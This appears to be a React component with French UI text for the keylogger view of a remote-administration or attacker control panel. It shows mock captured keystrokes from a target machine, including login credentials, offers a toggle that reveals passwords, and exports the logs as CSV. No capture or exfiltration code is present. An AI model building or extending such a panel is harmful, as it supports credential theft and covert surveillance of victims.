import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import {
  ArrowLeft,
  Key,
  Download,
  Trash2,
  RefreshCw,
  Search,
  Filter,
  Eye,
  EyeOff,
  Calendar,
  Clock
} from 'lucide-react';
import toast from 'react-hot-toast';

const Keylogger = () => {
  const { targetId } = useParams();
  const navigate = useNavigate();
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterApp, setFilterApp] = useState('all');
  const [showPasswords, setShowPasswords] = useState(false);
  const [selectedDate, setSelectedDate] = useState('');
  const [targetInfo, setTargetInfo] = useState(null);

  useEffect(() => {
    setTargetInfo({
      hostname: 'DESKTOP-ABC123',
      ip: '192.168.1.100'
    });
    fetchKeyloggerLogs();
  }, [targetId]);

  const fetchKeyloggerLogs = async () => {
    setLoading(true);
    
    // Simuler le chargement des logs du keylogger
    setTimeout(() => {
      const mockLogs = [
        {
          id: 1,
          timestamp: new Date(Date.now() - 3600000).toISOString(),
          application: 'Google Chrome',
          windowTitle: 'Gmail - Inbox',
          content: 'john.doe@email.COM{TAB}motdepasse123{ENTER}',
          isPassword: true,
          keyCount: 25
        },
        {
          id: 2,
          timestamp: new Date(Date.now() - 7200000).toISOString(),
          application: 'Microsoft Word',
          windowTitle: 'Document1 - Word',
          content: 'Bonjour, voici le rapport mensuel que vous avez demandé.',
          isPassword: false,
          keyCount: 58
        },
        {
          id: 3,
          timestamp: new Date(Date.now() - 10800000).toISOString(),
          application: 'Discord',
          windowTitle: 'Discord - #general',
          content: 'Salut tout le monde ! Comment ça va ?',
          isPassword: false,
          keyCount: 35
        },
        {
          id: 4,
          timestamp: new Date(Date.now() - 14400000).toISOString(),
          application: 'Firefox',
          windowTitle: 'Facebook - Log In',
          content: 'user@example.com{TAB}password123{ENTER}',
          isPassword: true,
          keyCount: 28
        },
        {
          id: 5,
          timestamp: new Date(Date.now() - 18000000).toISOString(),
          application: 'Notepad',
          windowTitle: 'notes.txt - Notepad',
          content: 'N\'oublie pas:\n- Réunion à 14h\n- Appeler le client\n- Finir le projet',
          isPassword: false,
          keyCount: 67
        },
        {
          id: 6,
          timestamp: new Date(Date.now() - 21600000).toISOString(),
          application: 'Cmd',
          windowTitle: 'Command Prompt',
          content: 'ipconfig{ENTER}ping google.com{ENTER}netstat -an{ENTER}',
          isPassword: false,
          keyCount: 42
        }
      ];
      
      setLogs(mockLogs);
      setLoading(false);
    }, 1500);
  };

  const formatTimestamp = (timestamp) => {
    const date = new Date(timestamp);
    return {
      date: date.toLocaleDateString('fr-FR'),
      time: date.toLocaleTimeString('fr-FR')
    };
  };

  const getApplicationIcon = (app) => {
    const lowerApp = app.toLowerCase();
    if (lowerApp.includes('chrome') || lowerApp.includes('firefox')) {
      return '🌐';
    } else if (lowerApp.includes('word') || lowerApp.includes('notepad')) {
      return '📝';
    } else if (lowerApp.includes('discord')) {
      return '💬';
    } else if (lowerApp.includes('cmd') || lowerApp.includes('terminal')) {
      return '💻';
    }
    return '📱';
  };

  const maskPassword = (content) => {
    // Simple masquage des mots de passe
    return content.replace(/[a-zA-Z0-9]/g, '•');
  };

  const downloadLogs = () => {
    const csvContent = [
      'Horodatage,Application,Titre,Contenu,Touches',
      ...filteredLogs.map(log => 
        `"${log.timestamp}","${log.application}","${log.windowTitle}","${log.content.replace(/"/g, '""')}","${log.keyCount}"`
      )
    ].join('\n');
    
    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogger_logs_${targetId}_${Date.now()}.csv`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast.success('Logs téléchargés');
  };

  const clearLogs = () => {
    if (window.confirm('Êtes-vous sûr de vouloir effacer tous les logs ?')) {
      setLogs([]);
      toast.success('Logs effacés');
    }
  };

  const applications = [...new Set(logs.map(log => log.application))];
  
  const filteredLogs = logs.filter(log => {
    const matchesSearch = log.content.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         log.application.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         log.windowTitle.toLowerCase().includes(searchTerm.toLowerCase());
    
    const matchesApp = filterApp === 'all' || log.application === filterApp;
    
    const matchesDate = !selectedDate || 
                       new Date(log.timestamp).toDateString() === new Date(selectedDate).toDateString();
    
    return matchesSearch && matchesApp && matchesDate;
  });

  const LogEntry = ({ log }) => {
    const { date, time } = formatTimestamp(log.timestamp);
    const displayContent = log.isPassword && !showPasswords ? maskPassword(log.content) : log.content;
    
    return (
      <div className={`border rounded-lg p-4 transition-colors ${
        log.isPassword ? 'border-discord-red bg-discord-red bg-opacity-5' : 'border-discord-gray-600 hover:bg-discord-gray-700'
      }`}>
        <div className="flex items-start justify-between mb-3">
          <div className="flex items-center space-x-3">
            <span className="text-2xl">{getApplicationIcon(log.application)}</span>
            <div>
              <h4 className="text-white font-medium">{log.application}</h4>
              <p className="text-sm text-discord-light">{log.windowTitle}</p>
            </div>
          </div>
          
          <div className="text-right text-sm">
            <div className="text-discord-light">{date}</div>
            <div className="text-discord-light">{time}</div>
            {log.isPassword && (
              <div className="text-discord-red text-xs mt-1 flex items-center">
                <Key className="w-3 h-3 mr-1" />
                Sensible
              </div>
            )}
          </div>
        </div>
        
        <div className="bg-discord-darkest rounded p-3 font-mono text-sm">
          <div className="text-discord-light mb-1 text-xs">
            {log.keyCount} touches enregistrées
          </div>
          <div className="text-white whitespace-pre-wrap break-all">
            {displayContent}
          </div>
        </div>
        
        {log.isPassword && showPasswords && (
          <div className="mt-2 text-xs text-discord-red flex items-center">
            <Eye className="w-3 h-3 mr-1" />
            Contenu sensible visible
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="space-y-6 fade-in">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <button
            onClick={() => navigate('/targets')}
            className="discord-button-secondary flex items-center space-x-2"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Retour</span>
          </button>
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center">
              <Key className="w-6 h-6 mr-2 text-discord-blurple" />
              Keylogger
            </h1>
            <p className="text-discord-light">
              {targetInfo ? `${targetInfo.hostname} (${targetInfo.ip})` : `Cible: ${targetId}`}
            </p>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          <button
            onClick={() => setShowPasswords(!showPasswords)}
            className={`flex items-center space-x-2 px-3 py-2 rounded text-sm transition-colors ${
              showPasswords ? 'bg-discord-red text-white' : 'discord-button-secondary'
            }`}
          >
            {showPasswords ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            <span>{showPasswords ? 'Masquer' : 'Afficher'} mots de passe</span>
          </button>
          
          <button
            onClick={downloadLogs}
            className="discord-button flex items-center space-x-2"
            disabled={filteredLogs.length === 0}
          >
            <Download className="w-4 h-4" />
            <span>Exporter</span>
          </button>
          
          <button
            onClick={fetchKeyloggerLogs}
            className="discord-button-secondary p-2"
            title="Actualiser"
          >
            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
          </button>
          
          <button
            onClick={clearLogs}
            className="bg-discord-red hover:bg-discord-red-dark text-white px-3 py-2 rounded flex items-center space-x-2"
          >
            <Trash2 className="w-4 h-4" />
            <span>Effacer</span>
          </button>
        </div>
      </div>

      {/* Statistics */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="discord-card text-center">
          <div className="text-2xl font-bold text-white">{logs.length}</div>
          <div className="text-sm text-discord-light">Entrées totales</div>
        </div>
        <div className="discord-card text-center">
          <div className="text-2xl font-bold text-discord-red">
            {logs.filter(log => log.isPassword).length}
          </div>
          <div className="text-sm text-discord-light">Contenus sensibles</div>
        </div>
        <div className="discord-card text-center">
          <div className="text-2xl font-bold text-discord-green">{applications.length}</div>
          <div className="text-sm text-discord-light">Applications</div>
        </div>
        <div className="discord-card text-center">
          <div className="text-2xl font-bold text-discord-blurple">
            {logs.reduce((sum, log) => sum + log.keyCount, 0)}
          </div>
          <div className="text-sm text-discord-light">Touches enregistrées</div>
        </div>
      </div>

      {/* Filters */}
      <div className="discord-card">
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-discord-gray-500 w-4 h-4" />
            <input
              type="text"
              placeholder="Rechercher dans les logs..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="discord-input pl-10"
            />
          </div>
          
          <select
            value={filterApp}
            onChange={(e) => setFilterApp(e.target.value)}
            className="discord-input"
          >
            <option value="all">Toutes les applications</option>
            {applications.map(app => (
              <option key={app} value={app}>{app}</option>
            ))}
          </select>
          
          <input
            type="date"
            value={selectedDate}
            onChange={(e) => setSelectedDate(e.target.value)}
            className="discord-input"
          />
          
          <div className="flex items-center space-x-2 text-sm text-discord-light">
            <Filter className="w-4 h-4" />
            <span>{filteredLogs.length} résultat(s)</span>
          </div>
        </div>
      </div>

      {/* Logs List */}
      <div className="space-y-4">
        {loading ? (
          <div className="space-y-4">
            {[...Array(3)].map((_, i) => (
              <div key={i} className="discord-card animate-pulse">
                <div className="flex items-start space-x-3 mb-3">
                  <div className="w-8 h-8 bg-discord-gray-600 rounded"></div>
                  <div className="flex-1">
                    <div className="h-4 bg-discord-gray-600 rounded mb-2 w-1/3"></div>
                    <div className="h-3 bg-discord-gray-600 rounded w-1/2"></div>
                  </div>
                </div>
                <div className="h-20 bg-discord-gray-600 rounded"></div>
              </div>
            ))}
          </div>
        ) : filteredLogs.length === 0 ? (
          <div className="discord-card text-center py-12">
            <Key className="w-16 h-16 text-discord-gray-500 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-white mb-2">Aucun log trouvé</h3>
            <p className="text-discord-light">
              {searchTerm || filterApp !== 'all' || selectedDate ? 
                'Aucun log ne correspond à vos critères de filtrage.' :
                'Aucune activité clavier n\'a été enregistrée pour cette cible.'
              }
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            {filteredLogs.map(log => (
              <LogEntry key={log.id} log={log} />
            ))}
          </div>
        )}
      </div>

      {/* Security Warning */}
      <div className="bg-discord-red bg-opacity-10 border border-discord-red rounded-lg p-4">
        <div className="flex items-start space-x-3">
          <Key className="w-5 h-5 text-discord-red flex-shrink-0 mt-0.5" />
          <div>
            <h4 className="text-sm font-medium text-discord-red mb-1">Avertissement de sécurité</h4>
            <p className="text-xs text-discord-light">
              Les données du keylogger peuvent contenir des informations sensibles comme des mots de passe. 
              Utilisez cette fonctionnalité uniquement dans un cadre légal et autorisé.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Keylogger;